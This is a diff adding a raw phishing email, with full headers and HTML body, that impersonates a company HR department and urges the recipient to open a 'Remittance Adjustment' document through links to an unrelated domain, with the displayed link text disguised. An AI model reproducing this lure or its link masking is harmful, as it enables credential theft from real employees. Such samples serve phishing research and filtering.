@@ -1,0 +1,159 @@
+Return-Path: HR@gullivair.com
+Delivered-To: jose@monkey.org
+X-FDA: 83935252590.25.AACE3D1
+Received: from mail.gullivair.com (mail.gullivair.com [95.87.232.125])
+	by imf29.b.hostedemail.com (Postfix) with ESMTP id 241A5120006
+	for <jose@monkey.org>; Sat, 27 Sep 2025 14:25:12 +0000 (UTC)
+Authentication-Results: imf29.b.hostedemail.com;
+	dkim=pass header.d=gullivair.com header.s=202002 header.b="mXV/mw21";
+	spf=pass (imf29.b.hostedemail.com: domain of HR@gullivair.com designates 95.87.232.125 as permitted sender) smtp.mailfrom=HR@gullivair.com;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1758983113;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=Kg8PB5Xdeqm3wUgbtLxgFdutrxrHY89h/12EnfK25xk=;
+	b=c8zRwRJRr+fhq4HUIWBmmBU78SvV/B0BZIXOfdFvzhu81Zm6Utz9lFksfDMvl5TcfCDEqy
+	iZKXDhJG7jfqWyI5+4k48tMHqRtk4q2vUuI4gzPLnomybasHZXA0zDQG2mKBYYkLUS86Bw
+	0Ge0epy9+JAU88g69pzqFOjjrbGZas0=
+ARC-Authentication-Results: i=1;
+	imf29.b.hostedemail.com;
+	dkim=pass header.d=gullivair.com header.s=202002 header.b="mXV/mw21";
+	spf=pass (imf29.b.hostedemail.com: domain of HR@gullivair.com designates 95.87.232.125 as permitted sender) smtp.mailfrom=HR@gullivair.com;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1758983113; a=rsa-sha256;
+	cv=none;
+	b=Wwbzz1FLg1kPvdqjXC93BOnVVMqua1QaUYrsp9kepOWoBcbIwOimaqOXcKFPvZEYc5RUI8
+	VV+O2wSe4vHEukMMyiOC5zzaQaHWphcxCbn+tsfqnXsYMW+Cgm1PmQFEJhcAmjnXFFG3tM
+	uCyoOCu9SuQdWl8TNfWnbRgDalgFu+g=
+Received: from localhost (localhost [127.0.0.1])
+	by mail.gullivair.com (Postfix) with ESMTP id 3A432606330F
+	for <jose@monkey.org>; Sat, 27 Sep 2025 14:25:11 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=gullivair.com;
+	s=202002; t=1758983111;
+	bh=snXxm5WypabyIs09dl26P2gANygT0EZ9UeJ4aDTYXl0=;
+	h=From:To:Subject:Date:From;
+	b=mXV/mw21Sl4z4coYcu9w0ZZIUNroHIqJXEUuG/0FkyBZRYtj9jcGm1NwUeu8eDScV
+	 qQ1ZTbAHnZoEmQhqWdj118zxpVpox92wSyjsl9PVdQOrd/ryx4Hrq0XxleX0z+VjDJ
+	 i9ZuSvjOU8sBD7GBJWLIJIjXx725ki7G6GpIb93g=
+X-Virus-Scanned: Debian amavisd-new at gullivair.com
+Received: from mail.gullivair.com ([127.0.0.1])
+	by localhost (mail.gullivair.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id qr4EQcmJikph for <jose@monkey.org>;
+	Sat, 27 Sep 2025 14:25:10 +0000 (UTC)
+Received: from [127.0.0.1] (ec2-35-91-54-239.us-west-2.compute.amazonaws.com [35.91.54.239])
+	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
+	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
+	(No client certificate requested)
+	by mail.gullivair.com (Postfix) with ESMTPSA id 69D5A6063292
+	for <jose@monkey.org>; Sat, 27 Sep 2025 14:25:10 +0000 (UTC)
+Content-Type: text/html
+From: "Monkey HR Dept. <Monkey Benefit Scheme>" <HR@gullivair.com>
+To: jose@monkey.org
+Subject: Monkey Important Document Review! Remmittance Adjustment.
+Message-ID: <ce08ed82-2344-4dfb-08dc-75befe4351d6@gullivair.com>
+Content-Transfer-Encoding: quoted-printable
+Date: Sat, 27 Sep 2025 14:25:08 +0000
+MIME-Version: 1.0
+X-Rspamd-Queue-Id: 241A5120006
+X-Stat-Signature: 3tgu9i5fm4aqzapsdo6x73n4rkecfonm
+X-Rspam-User: 
+X-Rspamd-Server: rspam06
+X-Spam-Status: Yes, score=15.30
+X-HE-Tag: 1758983112-772329
+X-HE-Meta: U2FsdGVkX1/htt/rZx0QI+UHATFrTmcImXaFAJkDlUp5drlCPx/xzoq7zF3UdP6BovgPqXVkQRjGszbH5eO+lOQmsdLeZE+xX0hBaphdOXA1dvjhzoYt9I0wRUdWkeCZZBC5HY81LAyLVFbmj2X2rlkzscSN6BML3BBaErhyOvnUP5jPwCe+1v/OfNBILPYdycBKlVzCO46F5Zm7LziZ4a+UwHJaI3Pz5woo2Ki0MqoCVXzMSCRv5e3ltpSTxeSNIHS86f+MM94GEMCqKSHQ94jFtN3BY6h9QSztdUAeOS7GCDT19hiCZJYzy5I6xgCmXWiWdak8K2vSgpxFGzdZWFaoDrcneFDo4Cum71TTJ0f8Uva/YL12+MlZ7ZaoNsSiRRve/ED8Cb9PNjp14krN8Abff+nR5flaCGkUsgjsyyJ2rkb/JouYS9U5ELWcXMxh7PwCRKnKoDsM3Gfebfjwe32vLXw5i7eGowNC1AcFYrZf3kFKTAmS2GWEx7RVbrnV6WmiCfr5/su/y/fr130S0pg4skbkYR8d3wj13KBLolV3izNkGVhfJp4q9BvVv2MRoV2FmUi5Pape455Ny/JuF3NCWzwTjMX4cEyhItvuZtVakcM+Mh/rDJ5bdKKND0XpUSzhoa6Ke2/dlkzv098XYtB29TNiIDwKuOo/DzD+1JSsQHyNujE3sBSY0C4CzDyMHLJZ8u1W/XqOy8WE09WWxwNqxV+lzKapVj2z30+8ppEELtb8z9CuvFtiz8GYJn61CFYOq8X3GIPUwd/0RHDMvSaI05WbxUxEGDONYjUbPe5mfPwRdVeCE0/jjYM1emvXeaxIndgEjB0HHyjmZkc/DWlwPm8LSvsxHC/oUPS4O09IiChP/9KTFuaBqAuMq7SR/eX9Cwk80baxnDzupmPOOmYZZnia+sRrLYxNM43RPygQK5AbGWviEhsdoDTnR3dQ7WE0Jx6pfeXYrD6VyMmmZI0b+7N
+ /IenNixIv+ujwXqqKLhHd8TXkp2PNemJ/VtPZKKqAzJbKPKCmtdCwmmKjaZ971fXR5OC0YoCymyPTL42C86HlA3QJKrdmvjUX5fJ+28R8moGQxG3mR9oHLAIUtgSQ3Oy8j38mJ/zeIGORd5hPBUntTjiFqUgEkbWN2wtVr9gkMhPRoKxERXyPpzKcQxvQd9lAngKPYbd4i3imIwBeRGxbIUBjA7rvA9Pgd7HNqUnda0bBVtHcUvHXXk3Y9PY9Sv3VMjWuWyQsHy8Ho2BKMHGSNC82m2VHU73l02BDCYJ6ouqtN7ok6ENLKhPfBFeIqO2VzjAqYRZuK/R0CMdnAkb0KDjRbtQP2wJ0EtUTLIKKl+R2wBMNgdDugDuDrm+IC8A5y5KUiKfsvoniAfaGI/Igfc67BODEtNav3+d2l7hqAQ2AzJdfPSN72M3H4QXbsUS94Ia1J7n+a6lLxihy0GfCeDmF7V7qb1961CvrMFY/SgByY8G5fVUJWX1mW/cJjcJB0OH+4BVO+BSHvETdVeyOH8BbAdsQ0tIPT1JMz+fubMKOqWkbAwUrZDXBmDydSysdtMLejsCd3HWeyoZuauiHxvc+b6jk15CKmJ4WMPLn1V2La2smlqwX3oMnCE2EV8f+EcUeseGeM7NXuVlzQQARKgbPyXBG/hpfQKK3uqLYPV/J8nkrvyUA9Xu3W7XXMyQFsVHn21KN1voJmsHajfJVGJ4EChSDy57ZNn4hIKSHE5zF1230fRhQJW4CGg==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 375
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" =
+class=3D"x_content-table" style=3D"width: 480px; color: rgb(33, 33, 33); =
+font-family: wf_segoe-ui_normal, &quot;Segoe UI&quot;, &quot;Segoe WP&quot;=
+, Tahoma, Arial, sans-serif, serif, EmojiFont; font-size: 15px; max-width: =
+480px; background-color: rgb(255, 255, 255); border: 1px solid rgb(237, 235=
+, 233); border-collapse: collapse !important;">
+	<tbody>
+		<tr>
+			<td style=3D"background-color: rgb(0, 120, 212); padding: 16px 20px; =
+color: rgb(255, 255, 255);">
+			<h1 style=3D"margin: 0px; font-size: 20px; =
+font-family: &quot;Segoe UI&quot;, sans-serif;">Document Review =
+Request</h1>
+			</td>
+		</tr>
+		<tr>
+			<td style=3D"padding: 20px;">
+			<div style=3D"font-size: 14px; margin-bottom: 16px; color: rgb(50, 49, =
+48);">Hello jose,</div>
+
+			<p style=3D"font-size: 14px; color: rgb(50, 49,=
+ 48); margin: 16px 0px; line-height: 1.4;">Monkey has requested that you =
+review &amp; sign the following document for processing.</p>
+
+			<div style=3D"background-color: rgb(248, 249, 250); border: 1px solid =
+rgb(237, 235, 233); border-radius: 2px; padding: 16px; margin: 16px 0px;">
+			<div style=3D"font-weight: 600; color: rgb(50, 49, 48); margin-bottom: =
+12px; font-size: 14px;">Document Reference: 2025_Remittance_Adjustment_9119=
+97</div>
+
+			<div style=3D"color: rgb(0, 120, 212); font-weight: 600; =
+margin: 8px 0px;">File: 2025_Remittance_Adjustment_20250421_(PL).pdf</div>
+
+			<div style=3D"color: rgb(96, 94, 92); margin: 16px 0px; font-size: 14px;=
+ text-align: center;">Please review this document at your earliest =
+convenience for Monkey</div>
+
+			<div style=3D"text-align: center; =
+font-size: 14px; color: rgb(96, 94, 92); margin: 12px 0px;">Year: =
+2025</div>
+			</div>
+
+			<div style=3D"text-align: center; margin: 20px =
+0px;"><a href=3D"https://037669052758997cf7624ecde8d98bae43431f.mobiegar.=
+com/qsutaa/podgsgj/julehgwguh/am9zZUBtb25rZXkub3Jn" rel=3D"noopener =
+noreferrer" style=3D"background-color: rgb(0, 120, 212); color: rgb(255, =
+255, 255); padding: 12px 20px; border: none; border-radius: 2px; font-size:=
+ 14px; font-weight: 600; text-decoration-line: none; display: inline-block;=
+ font-family: &quot;Segoe UI&quot;, sans-serif;" target=3D"_blank">Open =
+Document</a></div>
+
+			<p style=3D"font-size: 14px; color: rgb(50, 49, 48);=
+ margin: 16px 0px;">Alternative access method - use&nbsp;the&nbsp;link =
+below also:</p>
+
+			<div style=3D"word-break: break-all; font-size: 12px; =
+margin: 16px 0px; padding: 12px; background-color: rgb(248, 249, 250); =
+border-radius: 2px; border: 1px solid rgb(237, 235, 233);"><a =
+href=3D"https://618979052758997cf7624ecde8d98bae43431f.mobiegar.=
+com/qsutaa/podgsgj/julehgwguh/am9zZUBtb25rZXkub3Jn" rel=3D"noopener =
+noreferrer" style=3D"color: rgb(0, 120, 212);" target=3D"_blank">https://Mo=
+nkey document review for jose@monkey.org/?noptin_ns=3Dconfirm&amp;nv=3D35ag=
+gEuTBTDQ71dMi8GDi8SoaPczQXVS7o6EqHNyZfgV3L6Fnt0pUkcRQjwzxROO</a></div>
+
+			<p style=3D"font-size: 14px; color: rgb(50, 49, 48); margin: 16px =
+0px;">Best regards,<br />
+			Monkey Document Management Team</p>
+			</td>
+		</tr>
+		<tr>
+			<td style=3D"background-color: rgb(248, 249, 250); =
+padding: 16px 20px; font-size: 12px; color: rgb(96, 94, 92); border-top: =
+1px solid rgb(237, 235, 233);">
+			<p style=3D"margin: 8px 0px;">All Right =
+Reserved Monkey @2025</p>
+			</td>
+		</tr>
+	</tbody>
+</table>
+</body>
+</html>
